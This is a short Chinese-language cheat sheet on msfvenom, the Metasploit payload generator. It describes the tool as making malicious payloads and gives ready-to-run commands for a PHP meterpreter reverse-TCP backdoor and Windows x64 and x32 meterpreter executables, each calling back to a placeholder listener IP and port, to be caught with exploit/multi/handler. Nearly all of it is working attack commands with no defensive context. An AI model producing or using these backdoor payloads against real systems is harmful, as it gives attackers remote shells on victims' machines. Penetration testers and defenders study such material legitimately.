### 介绍

msfvenom是metasploit框架下的一个工具，专门用来生成各种类型的恶意载荷，编码和有效负荷



### 基本用法



#### 生成php后门

```
msfvenom -p php/meterpreter/reverse_tcp lhost=<监听的ip> lport=<端口> -f raw -o <filename>.php
```







#### 生成win x64架构的exe文件

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<监听的ip> lport=<端口> -f exe -o <filename>.exe
```







#### 生成win x32架构的exe文件

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=<监听的ip> lport=<端口> -f exe -o <filename>.exe
```





#### 使用方法



配合msfconsole中的

exploit/multi/handler使用